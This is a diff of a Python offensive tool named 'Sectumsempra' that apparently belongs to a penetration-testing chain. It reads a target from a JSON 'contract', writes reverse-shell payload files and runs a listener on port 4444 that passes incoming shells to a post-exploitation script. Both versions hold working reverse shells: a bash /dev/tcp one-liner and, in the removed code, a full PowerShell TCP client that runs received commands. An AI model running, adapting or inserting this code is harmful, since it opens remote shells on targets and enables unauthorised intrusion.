@@ -1,226 +1,153 @@
 #!/usr/bin/env python3
 """
-Sectumsempra v1.2 - Green Engine
-The Bridge: Socket Listener with Morsmordre Handoff
+Sectumsempra v3.0 - Green Engine
+Bulletproof Bridge
 """
 
-import asyncio
-import argparse
-import json
-import os
-import re
+import socket
 import subprocess
+import os
+import json
 import sys
 import time
+import threading
 from pathlib import Path
-from typing import Optional, Dict, Any
 
-try:
-    from rich.console import Console
-    from rich.panel import Panel
-    from rich.text import Text
-    RICH_AVAILABLE = True
-except ImportError:
-    RICH_AVAILABLE = False
+def status(msg, level="info"):
+    ts = time.strftime("%H:%M:%S")
+    colors = {"info": "\033[94m", "success": "\033[92m", "warning": "\033[93m", "error": "\033[91m", "shell": "\033[91m", "handoff": "\033[95m"}
+    ind = {"info": "[*]", "success": "[+]", "warning": "[!]", "error": "[-]", "shell": "[SHELL]", "handoff": "[»]"}
+    print(f"{colors.get(level, '')}{ind.get(level, '[*]')} [{ts}] {msg}\033[0m", flush=True)
 
-class Sectumsempra:
-    def __init__(self):
-        self.console = Console() if RICH_AVAILABLE else None
-        self.lhost: Optional[str] = None
-        self.lport: int = 4444
-        self.target_os: str = "Linux"
-        self.target_ip: str = ""
-        self.contract_file: Optional[str] = None
-        
-    def banner(self):
-        banner = r"""
-    ███████╗███████╗ ██████╗████████╗██╗   ██╗███╗   ███╗███████╗███████╗███╗   ███╗██████╗ ██████╗  █████╗ 
-    ██╔════╝██╔════╝██╔════╝╚══██╔══╝██║   ██║████╗ ████║██╔════╝██╔════╝████╗ ████║██╔══██╗██╔══██╗██╔══██╗
-    ███████╗█████╗  ██║        ██║   ██║   ██║██╔████╔██║███████╗█████╗  ██╔████╔██║██████╔╝██████╔╝███████║
-    ╚════██║██╔══╝  ██║        ██║   ██║   ██║██║╚██╔╝██║╚════██║██╔══╝  ██║╚██╔╝██║██╔═══╝ ██╔══██╗██╔══██║
-    ███████║███████╗╚██████╗   ██║   ╚██████╔╝██║ ╚═╝ ██║███████║███████╗██║ ╚═╝ ██║██║     ██║  ██║██║  ██║
-    ╚══════╝╚══════╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝
-        """
-        if self.console:
-            self.console.print(Panel(Text(banner, style="bold green"), 
-                                   subtitle="[green]v1.2 Green Engine - The Bridge[/green]",
-                                   border_style="green"))
-        else:
-            print(f"\033[92m{banner}\033[0m")
-            print(f"\033[92m>>> Sectumsempra v1.2 - Green Engine <<<\033[0m\n")
+def banner():
+    print("\033[92m┌─────────────────────────────────────┐\033[0m")
+    print("\033[92m│ Sectumsempra v3.0 - Green Bridge  │\033[0m")
+    print("\033[92m└─────────────────────────────────────┘\033[0m")
+
+def find_tun0():
+    try:
+        import netifaces
+        if 'tun0' in netifaces.interfaces():
+            return netifaces.ifaddresses('tun0')[netifaces.AF_INET][0]['addr']
+    except:
+        pass
+    try:
+        import re
+        r = subprocess.run(["ip", "addr", "show", "tun0"], capture_output=True, text=True)
+        m = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', r.stdout)
+        if m:
+            return m.group(1)
+    except:
+        pass
+    return "0.0.0.0"
+
+def load_contract():
+    files = sorted(Path('.').glob('netweave_*.json'))
+    if not files:
+        status("No NetWeave contract found", "error")
+        sys.exit(1)
     
-    def status(self, msg: str, level: str = "info"):
-        ts = time.strftime("%H:%M:%S")
-        indicators = {
-            "info": "[*]", "success": "[+]", "warning": "[!]", 
-            "error": "[-]", "handoff": "[»]", "shell": "[SHELL]"
-        }
-        ind = indicators.get(level, "[*]")
-        
-        if self.console:
-            color = {"info": "blue", "success": "green", "warning": "yellow", 
-                    "error": "red", "handoff": "magenta", "shell": "red"}.get(level, "white")
-            self.console.print(f"[{color}]{ind} [{ts}] {msg}[/{color}]")
-        else:
-            colors = {"info": "\033[94m", "success": "\033[92m", 
-                     "warning": "\033[93m", "error": "\033[91m", 
-                     "handoff": "\033[95m", "shell": "\033[91m"}
-            print(f"{colors.get(level, '')}{ind} [{ts}] {msg}\033[0m")
+    with open(files[-1]) as f:
+        data = json.load(f)
     
-    def find_tun0(self) -> str:
-        try:
-            import netifaces
-            if 'tun0' in netifaces.interfaces():
-                addrs = netifaces.ifaddresses('tun0')
-                if netifaces.AF_INET in addrs:
-                    return addrs[netifaces.AF_INET][0]['addr']
-        except:
-            pass
-        
-        try:
-            result = subprocess.run(["ip", "addr", "show", "tun0"], 
-                                capture_output=True, text=True)
-            match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', result.stdout)
-            if match:
-                return match.group(1)
-        except:
-            pass
-        
-        return "0.0.0.0"
+    status(f"Contract: {files[-1]}", "success")
+    status(f"Target: {data.get('target', '')} | OS: {data.get('operating_system', 'Linux')}", "info")
+    return data
+
+def generate_payload(lhost, target_ip):
+    bash = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/4444 0>&1'"
+    filename = f"payload_linux_{target_ip.replace('.', '_')}.sh"
+    with open(filename, 'w') as f:
+        f.write(f"#!/bin/bash\n{bash}")
+    os.chmod(filename, 0o755)
+    status(f"Payload: {filename}", "success")
+    status(f"Execute on target: bash {filename}", "info")
+    return filename
+
+def handle_connection(sock, addr, target, os_type, lhost):
+    status(f"SHELL LANDED from {addr[0]}:{addr[1]}", "shell")
+    status("Spawning Morsmordre...", "handoff")
     
-    def load_contract(self, filename: Optional[str] = None) -> Dict:
-        if filename:
-            self.contract_file = filename
-        else:
-            files = sorted(Path('.').glob('netweave_*.json'))
-            if not files:
-                self.status("No NetWeave contract found", "error")
-                sys.exit(1)
-            self.contract_file = str(files[-1])
-        
-        with open(self.contract_file) as f:
-            data = json.load(f)
-        
-        self.target_ip = data.get('target', '')
-        self.target_os = data.get('operating_system', 'Linux')
-        
-        self.status(f"Contract: {self.contract_file}", "success")
-        self.status(f"Target: {self.target_ip} | OS: {self.target_os}", "info")
-        return data
+    # Set up environment
+    env = os.environ.copy()
+    env['MORSMORDRE_TARGET'] = target
+    env['MORSMORDRE_OS'] = os_type
+    env['MORSMORDRE_LHOST'] = lhost
     
-    def generate_payload(self) -> str:
-        self.lhost = self.find_tun0()
-        self.status(f"LHOST: {self.lhost}", "success")
-        
-        if "Windows" in self.target_os:
-            ps = f"""$client = New-Object System.Net.Sockets.TCPClient('{self.lhost}',{self.lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
-            filename = f"payload_windows_{self.target_ip.replace('.', '_')}.ps1"
-            with open(filename, 'w') as f:
-                f.write(ps)
-            display = f"powershell -ExecutionPolicy Bypass -File {filename}"
-        else:
-            bash = f"""bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"""
-            filename = f"payload_linux_{self.target_ip.replace('.', '_')}.sh"
-            with open(filename, 'w') as f:
-                f.write(f"#!/bin/bash\n{bash}")
-            os.chmod(filename, 0o755)
-            display = f"bash {filename}"
-        
-        self.status(f"Payload: {filename}", "success")
-        self.status(f"Execute on target: {display}", "info")
-        return filename
+    # Create file objects from socket
+    sock_file = sock.makefile('rwb', buffering=0)
     
-    async def bridge_connection(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
-        addr = writer.get_extra_info('peername')
-        self.status(f"SHELL LANDED from {addr[0]}:{addr[1]}", "shell")
-        self.status("Handing off to Morsmordre...", "handoff")
-        
-        env = os.environ.copy()
-        env['MORSMORDRE_TARGET'] = self.target_ip
-        env['MORSMORDRE_OS'] = self.target_os
-        env['MORSMORDRE_LHOST'] = self.lhost
-        
-        proc = await asyncio.create_subprocess_exec(
-            sys.executable, 'morsmordre.py',
-            stdin=asyncio.subprocess.PIPE,
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE,
+    try:
+        # Spawn Morsmordre with socket as stdin/stdout
+        proc = subprocess.Popen(
+            [sys.executable, 'morsmordre.py'],
+            stdin=sock_file,
+            stdout=sock_file,
+            stderr=subprocess.PIPE,  # Keep stderr local for debugging
             env=env
         )
         
-        async def socket_to_proc():
-            try:
-                while True:
-                    data = await reader.read(4096)
-                    if not data:
-                        break
-                    proc.stdin.write(data)
-                    await proc.stdin.drain()
-            except:
-                pass
-            finally:
-                try:
-                    proc.stdin.close()
-                except:
-                    pass
+        # Read stderr in thread to show Morsmordre output locally
+        def read_stderr():
+            while True:
+                line = proc.stderr.readline()
+                if not line:
+                    break
+                print(line.decode('utf-8', errors='ignore'), end='', flush=True)
         
-        async def proc_to_socket():
-            try:
-                while True:
-                    data = await proc.stdout.read(4096)
-                    if not data:
-                        break
-                    writer.write(data)
-                    await writer.drain()
-            except:
-                pass
+        err_thread = threading.Thread(target=read_stderr)
+        err_thread.daemon = True
+        err_thread.start()
         
+        status("Morsmordre running - wait for it to complete...", "success")
+        proc.wait()
+        status("Morsmordre finished", "success")
+        
+    except Exception as e:
+        status(f"Error: {e}", "error")
+    finally:
         try:
-            await asyncio.gather(socket_to_proc(), proc_to_socket())
+            sock_file.close()
         except:
             pass
-        
         try:
-            proc.terminate()
-            await proc.wait()
+            sock.close()
         except:
             pass
-            
-        try:
-            writer.close()
-            await writer.wait_closed()
-        except:
-            pass
-            
-        self.status("Session closed", "warning")
-    
-    async def start_listener(self):
-        server = await asyncio.start_server(
-            self.bridge_connection, '0.0.0.0', self.lport
-        )
-        
-        self.status(f"Listener: 0.0.0.0:{self.lport}", "success")
-        self.status("Waiting for shell...", "info")
-        
-        async with server:
-            await server.serve_forever()
-    
-    def run(self, contract_file: Optional[str] = None):
-        self.banner()
-        self.load_contract(contract_file)
-        self.generate_payload()
-        
-        try:
-            asyncio.run(self.start_listener())
-        except KeyboardInterrupt:
-            self.status("Terminated", "warning")
+        status("Session closed", "warning")
 
 def main():
-    parser = argparse.ArgumentParser(description='Sectumsempra v1.2 - Green Engine')
-    parser.add_argument('--contract', help='Path to NetWeave JSON contract')
-    args = parser.parse_args()
+    banner()
     
-    Sectumsempra().run(args.contract)
+    data = load_contract()
+    target_ip = data.get('target', '')
+    os_type = data.get('operating_system', 'Linux')
+    lhost = find_tun0()
+    
+    status(f"LHOST: {lhost}", "success")
+    generate_payload(lhost, target_ip)
+    
+    # Create server
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server.bind(('0.0.0.0', 4444))
+    server.listen(1)
+    
+    status("Listener: 0.0.0.0:4444", "success")
+    status("Waiting for shell...", "info")
+    
+    try:
+        while True:
+            client, addr = server.accept()
+            # Handle in thread
+            t = threading.Thread(target=handle_connection, 
+                               args=(client, addr, target_ip, os_type, lhost))
+            t.daemon = True
+            t.start()
+    except KeyboardInterrupt:
+        status("Shutting down...", "warning")
+    finally:
+        server.close()
 
 if __name__ == "__main__":
     main()
